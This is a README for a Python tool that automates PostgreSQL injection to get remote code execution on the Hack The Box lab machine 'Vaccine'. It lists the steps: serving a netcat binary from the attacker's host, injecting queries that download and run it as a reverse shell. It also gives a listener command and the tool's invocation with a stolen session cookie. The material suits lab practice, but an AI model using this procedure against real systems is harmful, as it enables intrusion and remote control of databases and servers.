# PostgreSQL-Shell

## DESCRIPTION
A Python program that automates the process of error-based PostgreSQL injection RCE on the MegaCorp Car Catalogue-
Website running on of one of the Hack The Box's machine 'Vaccine' http://10.10.10.46/dashboard.php

It provides reverse shell connection to the attacker by mainly doing the followings:
1. Copies the origial Netcat file (/usr/bin/nc) to the local /tmp directory of the attacker's machine.
2. Sets up an HTTP server on the local /tmp directory.
3. Creates a new table in the database of the target server.
4. Injects a query that initiates a file transfer command to download a Netcat binary file from attacker's machine.
5. Injects a query that executes the downloaded Netcat to initiate reverse shell.

This is to be used for educational and security testing purposes only and I'm not responsible for the misuse of this program.


## REQUIREMENTS
The attacker must have been authenticated, and have obtained the session cookie.


## ORIGINAL SOURCE
https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection  
https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine  
Modifier: lkim94


## CAUTION
The shell disconnects when there's a few minutes of inactivity.  
Terminating this program's process while the shell is active can also cause unexpected disconnection, and improper houseclean.


## USAGE

1. Set up a listener --- `nc -lvnp <listen_port#>`  
2. Run the program from another terminal window --- `python3 PostgreSQL-Shell.py -L <attacker_ip> -l <listen_port#> -t <target_ip> -p <url_parameter> -c <cookie>`  


## EXAMPLE
1. Setting up a listener.  
![PostgreSQL-ShellyPoC1](https://user-images.githubusercontent.com/83319068/130559443-c6f3554e-2a73-41a9-bb38-603e912230be.png)

2. Running the program.  
![PostgreSQL-ShellyPoC2](https://user-images.githubusercontent.com/83319068/130880953-d5545818-00f2-419f-94bd-033b516c7048.png)

3. Shell spawning on the listener.  
![PostgreSQL-ShellyPoC3](https://user-images.githubusercontent.com/83319068/130880966-17760935-4a43-4144-ae92-b6ccf5e3396c.png)

4. Program quitting by performing houseclean.  
![PostgreSQL-ShellyPoC4](https://user-images.githubusercontent.com/83319068/130880971-b16b4c38-9818-45e3-a1f9-972e8687dd45.png)
